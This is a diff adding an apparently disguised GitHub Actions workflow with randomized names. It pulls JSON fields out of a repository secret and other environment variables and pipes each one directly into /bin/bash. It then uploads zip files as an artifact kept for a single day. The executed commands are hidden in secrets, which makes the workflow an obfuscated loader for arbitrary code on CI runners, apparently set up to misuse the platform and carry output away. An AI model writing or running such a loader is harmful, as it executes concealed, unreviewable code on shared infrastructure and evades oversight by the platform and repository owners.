@@ -1,0 +1,23 @@
+name: karentailwind5414
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: karentailwind5414
+        env:
+          yu52: ${{ secrets.yu52 }}
+        run: |
+          printf '%s' "$yu52" | jq -r .yntxw75 | /bin/bash
+          echo $y81445 | jq -r .bwer88823 | /bin/bash
+          printf '%s' "$uufsx65479" | jq -r .rqsx93 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: s0DeA3Km
+          path: "*.zip"
+          retention-days: 1
